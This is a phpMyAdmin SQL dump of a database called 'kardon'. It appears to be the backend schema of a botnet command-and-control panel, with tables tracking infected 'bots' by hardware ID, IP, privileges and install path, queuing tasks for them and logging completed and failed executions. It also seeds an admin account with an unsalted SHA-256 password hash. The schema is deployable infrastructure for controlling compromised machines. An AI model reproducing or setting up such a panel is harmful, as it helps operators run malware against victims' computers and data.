-- phpMyAdmin SQL Dump
-- version 4.7.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Oct 30, 2018 at 03:40 AM
-- Server version: 5.7.19-log
-- PHP Version: 5.6.31

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `kardon`
--

-- --------------------------------------------------------

--
-- Table structure for table `bots`
--

DROP TABLE IF EXISTS `bots`;
CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hwid` varchar(100) NOT NULL,
  `ip` varchar(100) NOT NULL,
  `country` varchar(100) NOT NULL,
  `installdate` varchar(100) NOT NULL,
  `lastresponce` varchar(100) NOT NULL,
  `currenttask` varchar(100) NOT NULL,
  `osversion` varchar(100) NOT NULL,
  `cpuarchitect` varchar(100) NOT NULL,
  `computername` varchar(100) NOT NULL,
  `username` varchar(100) NOT NULL,
  `privileges` varchar(100) NOT NULL,
  `bottype` varchar(100) DEFAULT NULL,
  `installpath` varchar(255) DEFAULT NULL,
  `botversion` varchar(100) NOT NULL,
  `mark` varchar(1) NOT NULL,
  `build_name` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `plogs`
--

DROP TABLE IF EXISTS `plogs`;
CREATE TABLE IF NOT EXISTS `plogs` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `ipaddress` varchar(75) NOT NULL,
  `action` text NOT NULL,
  `date` int(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `plugins`
--

DROP TABLE IF EXISTS `plugins`;
CREATE TABLE IF NOT EXISTS `plugins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hwid` varchar(255) NOT NULL,
  `guid` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `desc` varchar(255) NOT NULL,
  `vers` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
CREATE TABLE IF NOT EXISTS `settings` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `knock` int(10) NOT NULL,
  `dead` int(10) NOT NULL,
  `gate_status` int(1) NOT NULL,
  `c_sideBarTop` varchar(20) DEFAULT NULL,
  `c_sideBarMain` varchar(20) DEFAULT NULL,
  `c_header` varchar(20) DEFAULT NULL,
  `c_main` varchar(20) DEFAULT NULL,
  `c_mainAlt` varchar(20) DEFAULT NULL,
  `c_chart` varchar(20) DEFAULT NULL,
  `header` varchar(700) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `knock`, `dead`, `gate_status`, `c_sideBarTop`, `c_sideBarMain`, `c_header`, `c_main`, `c_mainAlt`, `c_chart`, `header`) VALUES
(1, 5, 7, 1, 'blue-grey-900', 'blue-grey-800', 'blue-grey-800', 'grey-100', 'white', '#FFFFFF', '');

-- --------------------------------------------------------

--
-- Table structure for table `tasks`
--

DROP TABLE IF EXISTS `tasks`;
CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `task` varchar(100) NOT NULL,
  `params` text NOT NULL,
  `filters` text NOT NULL,
  `executions` varchar(100) NOT NULL,
  `username` varchar(50) NOT NULL,
  `status` int(1) NOT NULL,
  `date` int(50) NOT NULL,
  `fbc` int(11) DEFAULT NULL,
  `fbi` int(11) DEFAULT NULL,
  `fbb` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tasks_completed`
--

DROP TABLE IF EXISTS `tasks_completed`;
CREATE TABLE IF NOT EXISTS `tasks_completed` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `bothwid` varchar(100) NOT NULL,
  `taskid` int(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tasks_failed`
--

DROP TABLE IF EXISTS `tasks_failed`;
CREATE TABLE IF NOT EXISTS `tasks_failed` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `bothwid` varchar(100) NOT NULL,
  `taskid` int(255) NOT NULL,
  `error` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(300) NOT NULL,
  `privileges` varchar(300) NOT NULL,
  `status` int(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `privileges`, `status`) VALUES
(4, 'admin', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', 'admin', 1);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
